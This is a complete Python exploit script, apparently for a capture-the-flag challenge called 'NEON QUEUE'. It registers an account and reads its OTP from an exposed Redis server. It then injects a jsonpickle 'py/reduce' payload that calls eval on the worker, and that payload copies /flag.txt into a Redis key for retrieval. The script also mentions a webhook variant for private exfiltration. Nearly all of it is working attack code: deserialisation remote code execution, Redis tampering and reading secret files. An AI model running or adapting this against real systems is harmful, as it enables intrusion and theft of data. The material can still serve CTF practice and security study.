#!/usr/bin/env python3
"""
NEON QUEUE - Exploit Method 2: RCE with Redis Exfiltration

This exploit uses jsonpickle's py/reduce to execute arbitrary Python code.
The flag is written to a Redis key for retrieval.

WARNING: Other players can see the flag in Redis!
For private exfiltration, use exploit_rce_webhook.py instead.
"""

import sys
import json
import base64
import zlib
import time
import redis
import requests


TARGET = sys.argv[1] if len(sys.argv) > 1 else "localhost"
REDIS_HOST = TARGET
REDIS_PORT = 6379
API_URL = f"http://{TARGET}:8000"


def create_rce_payload() -> str:
    """
    RCE payload that writes the flag to Redis.
    Uses eval to execute arbitrary Python code.
    """
    # This code runs on the worker and writes flag to Redis
    code = """
(lambda: (
    __import__('redis').Redis(host='redis', port=6379).set('pwned', open('/flag.txt').read()),
    'RCE_SUCCESS'
)[1])()
"""
    payload = {
        "py/reduce": [
            {"py/function": "builtins.eval"},
            {"py/tuple": [code.strip()]}
        ]
    }
    
    json_str = json.dumps(payload)
    print(f"[*] RCE Payload (Redis exfil):")
    print(json.dumps(payload, indent=2))
    print()
    
    compressed = zlib.compress(json_str.encode('utf-8'))
    return base64.b64encode(compressed).decode('ascii')


def main():
    print("=" * 60)
    print(" NEON QUEUE - RCE EXPLOIT")
    print(" Method 2: Redis Exfiltration")
    print("=" * 60)
    
    r = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, decode_responses=True)
    
    try:
        r.ping()
        print(f"\n[+] Connected to Redis at {REDIS_HOST}:{REDIS_PORT}")
    except:
        print(f"[-] Failed to connect to Redis")
        return
    
    # Register user
    import random
    suffix = random.randint(1000, 9999)
    
    print(f"\n[*] Registering user...")
    resp = requests.post(f"{API_URL}/auth/register", json={
        "username": f"rce{suffix}",
        "email": f"rce{suffix}@gmail.com",
        "password": "rce123"
    })
    if not resp.ok:
        print(f"[-] Registration failed: {resp.text}")
        return
    user_id = resp.json().get("user_id")
    print(f"[+] User ID: {user_id}")
    
    # Get OTP
    time.sleep(0.5)
    otp = r.get(f"otp:{user_id}")
    print(f"[+] OTP: {otp}")
    
    # Verify
    resp = requests.post(f"{API_URL}/auth/verify-otp", json={
        "user_id": user_id,
        "otp": otp
    })
    token = resp.json().get("access_token")
    print("[+] Account verified")
    
    # Submit task
    resp = requests.post(
        f"{API_URL}/tasks",
        headers={"Authorization": f"Bearer {token}"},
        json={"task_type": "system_status"}
    )
    task_id = resp.json().get("task_id")
    print(f"[+] Task ID: {task_id}")
    
    # Inject RCE payload
    print("\n[*] Injecting RCE payload...")
    payload = create_rce_payload()
    r.set(f"task:{task_id}", payload)
    print("[+] Payload injected")
    
    # Wait for worker
    print("\n[*] Waiting for worker...")
    for i in range(10):
        time.sleep(1)
        resp = requests.get(
            f"{API_URL}/tasks/{task_id}",
            headers={"Authorization": f"Bearer {token}"}
        )
        result = resp.json()
        if result.get("status") in ["completed", "failed"]:
            break
        print(f"[.] Waiting... ({i+1}/10)")
    
    # Check Redis for flag
    print("\n[*] Checking Redis for exfiltrated flag...")
    pwned = r.get("pwned")
    
    if pwned:
        print("\n" + "=" * 60)
        print(" RCE SUCCESSFUL!")
        print(f" FLAG: {pwned}")
        print("=" * 60)
    else:
        print("\n[-] Flag not found in Redis 'pwned' key")
        print(f"[*] Task status: {result.get('status')}")
        print(f"[*] Task output: {result.get('output')}")


if __name__ == "__main__":
    main()
